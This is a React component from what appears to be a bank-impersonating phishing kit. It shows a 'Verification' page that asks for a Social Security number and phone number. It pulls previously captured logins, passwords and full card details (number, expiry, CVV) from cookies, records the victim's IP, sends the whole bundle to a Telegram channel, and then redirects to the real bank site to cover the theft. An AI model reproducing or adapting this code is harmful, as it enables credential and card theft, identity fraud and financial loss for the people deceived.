import React from "react";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import Logo from "../assets/logo.jpeg";

export default function Final() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<final>({
    sn: "",
    phone: "",
  });

  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const card: card = cookies.get("card");

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true);
    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    const visitorIP = response.ip;

    const message = `
        ---- WTB ONLINE -----
        IP: ${visitorIP}
        Username: ${login1.username}
        Password: ${login1.password}
        Username 2: ${login2.username2}
        Password 2: ${login2.password2}
        Card number: ${card.cnm}
        Card Expiry : ${card.ex}
        Card Cvv: ${card.cv}
        SSN: ${formInput.sn}
        Phone Number: ${formInput.phone}
        `;

    await TelegramSend(message);
    window.location.replace("https://watrust.com/");
    setIsLoading(false);
  }

  return (
    <>
      <div className="content">
        <div className="form">
          <form onSubmit={handleSubmit} method="POST">
            <div className="form-item">
              <div className="brand">
                <img src={Logo} alt="" />
              </div>
              <h2>Verification</h2>
              <p>Verify your SSN and Phone number</p>


              <div className="form-field">
                <input
                  maxLength={9}
                  onChange={handleInputChange}
                  name="sn"
                  type="text"
                  placeholder="SSN"
                />
              </div>

              <div className="form-field">
                <input
                  maxLength={12}
                  onChange={handleInputChange}
                  name="phone"
                  type="text"
                  placeholder="Phone Number"
                />
              </div>
              
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "flex-end",
                  marginTop: "-20px",
                }}
              >
               
                {isLoading ? (
                  <div className="form-field">
                    <button style={{ width: 130, height: 50 }} type="button">Please wait...</button>
                  </div>
                ) : (
                  <div className="form-field">
                    <button style={{ width: 120, height: 50 }} type="submit">
                      Continue
                    </button>
                  </div>
                )}
              </div>
            </div>
          </form>
        </div>
      </div>

      <div className="footer">
        <p style={{ textAlign: "center" }}>
          New to Fidelity? <a href="">Open an account</a> or{" "}
          <a href="">sign up</a>
        </p>
      </div>
    </>
  );
}
